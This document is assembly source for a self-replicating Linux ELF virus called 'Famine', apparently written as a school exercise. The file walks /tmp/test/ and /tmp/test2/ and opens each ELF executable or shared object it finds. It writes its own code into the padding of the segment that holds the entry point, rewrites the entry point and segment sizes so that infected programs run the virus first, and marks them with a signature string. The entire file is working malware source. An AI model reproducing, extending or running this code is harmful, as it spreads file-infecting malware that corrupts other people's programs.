%include "./header.s"

section     .text
global      _start                              ;must be declared for linker (ld)


_host:
	mov rax, _exit
	syscall


_start:   ;tell linker entry point
	push rdi
	push rsi
	push rcx
	push rdx

	push rbp
	mov rbp, rsp
	sub rbp, famine_size
	lea rax, [rel _start]
	mov rdx, [rel virus_entry]
	sub rax, rdx
	add rax, [rel host_entry]
	push rax
	lea rdi, [rel infect_dir]
	
.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax

.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, STACK(famine.dir_fd)
	mov rax, _getdents
	syscall
	test  rax,rax
	jle .closedir
	xor r13, r13
	mov r12, rax

.file:
	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_DIR
	je .adddir
	cmp al, DT_REG
	jne .nextfile
	call process

.nextfile:
	cmp r13, r12
	jl .file
	jmp .readdir

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	xor ecx, ecx
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb
	cmp byte[rdi], 0
	jnz .opendir
	pop rax
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp rax

.adddir:
	PUSH

	mov rsi, r14
	mov rax, rdi
	lea rdi, STACK(famine.file_path)
	mov rdx, rdi
	cmp byte[rax], 0x2e
	je .skip
	.dna:
	movsb
	cmp byte[rsi], 0
	jnz .dna
	mov rsi, rax
	.fna:
	movsb
	cmp byte[rsi -1], 0
	jnz .fna
	mov rdi, rdx

	mov rsi, rdi
	call _strlen
	mov rdx, rax
	mov rax, 1
	mov rdi, 1
	syscall
	.skip:
	POP
	cmp al, DT_REG
	jne .nextfile
	call process
	jmp .nextfile
	
process:
	mov rsi, r14
	mov rax, rdi
	lea rdi, STACK(famine.file_path)
	mov rdx, rdi

.dirname:
	movsb
	cmp byte [rsi], 0
	jnz .dirname
	mov rsi, rax

.filename:
	movsb
	cmp byte[rsi - 1], 0
	jnz .filename
	mov rdi, rdx
				;open file
	mov rsi, O_RDWR
	mov rax, _open
	syscall


	test eax, eax
	jl .return
	mov STACK(famine.file_fd), rax

				;stat
	lea rsi, STACK(famine.stat)
	mov rdi, rax
	mov rax, _fstat
	syscall
	cmp rax, 0
	jnz .close
	mov rsi, qword STACK(famine.stat + stat.st_size)
	mov STACK(famine.file_size), rsi
	cmp rsi, elf64_ehdr_size + elf64_phdr_size + VIRUS_SIZE
	jl .close
				;MMAP file
	xor r9, r9
	mov r8, STACK(famine.file_fd)
	mov r10, MAP_SHARED
	mov rdx, PROT_READ | PROT_WRITE
	xor rdi, rdi
	mov rax, _mmap
	syscall
	cmp rax, MMAP_ERRORS
	jae .close
	mov STACK(famine.file_data), rax
	mov rdi, rax
	call check_elf64
	test al,al
	jz .unmap
	call inject_self

.unmap:
	mov rsi, STACK(famine.file_size)
	mov rdi, STACK(famine.file_data)
	mov rax, _munmap
	syscall

.close:
	mov rdi, STACK(famine.file_fd)
	mov rax, _close
	syscall

.return:
	ret

check_elf64:
	xor rax, rax
	cmp qword[rdi+8], rax
	jnz .return
	mov rdx, _SYSV_			;elf SYSV
	cmp qword [rdi], rdx
	jz .continue
	mov rdx, _GNU_			;ELF_GNU
	cmp qword[rdi], rdx
	jnz .return

.continue:
	mov rdx, _DYN_
	cmp qword[rdi + 16], rdx
	jz .ok
	mov rdx, _EXEC_
	cmp qword[rdi + 16], rdx
	jnz .return
.ok:
	inc rax
.return:
	ret

inject_self:
	push r13
	push r14
	push r15
	mov r15, rdi
	mov rdx, qword [rdi + elf64_ehdr.e_entry]
	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
	mov rax, qword[rdi + elf64_ehdr.e_phoff]
	add rdi,rax
	mov r14, rdi

	.segment:
	cmp rcx, 0
	jle .return
	mov rax, SEGMENT_TYPE
	cmp rax, qword [rdi]
	jnz .next
	mov rax, qword[rdi + elf64_phdr.p_vaddr]
	cmp rdx, rax
	jb .next
	add rax, qword[rdi + elf64_phdr.p_memsz]
	mov r13, rax
	cmp rdx, rax
	jl .find_space

	.next:
	add rdi, elf64_phdr_size
	dec rcx
	jmp .segment

	.find_space:
							;check if availables space in 0s
	mov rax, qword [rdi + elf64_phdr.p_offset]
	add rax, qword [rdi + elf64_phdr.p_filesz]
	lea rdi, [r15 + rax]
	mov rsi, rdi
	xor al, al
	mov rcx, VIRUS_SIZE
	repz scasb
	test rcx, rcx
							;check if already infected
	lea rdi, [rel _start]
	xchg rdi, rsi
	mov rax, [rel signature]
	cmp rax, qword [rdi  - (_finish - signature)]
	jz .return

							;infect
	mov rcx, VIRUS_SIZE
	repnz movsb
							;set ep
	mov rax, qword[r15 + elf64_ehdr.e_entry]
	mov qword [rdi - 16], r13
	mov qword [rdi - 8], rax
							;edit header
	mov [r15 + elf64_ehdr.e_entry], r13
	mov rax, VIRUS_SIZE
	add qword [r14 + elf64_phdr.p_filesz], rax
	add qword [r14 + elf64_phdr.p_memsz], rax

	.return :
		pop r15
		pop r14
		pop r13
		ret


_strlen:
	push rcx
	push rdi
	xor rcx, rcx
_strlen_next:
	cmp [rdi], byte 0
	jz _strlen_null
	inc rcx
	inc rdi
	jmp _strlen_next
_strlen_null:
	mov rax, rcx
	pop rdi
	pop rcx
	ret

infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
signature		db			'Famine version 99.0 (c)oded by <araout>', 0xa
virus_entry		dq			_start
host_entry		dq			_host
_finish:
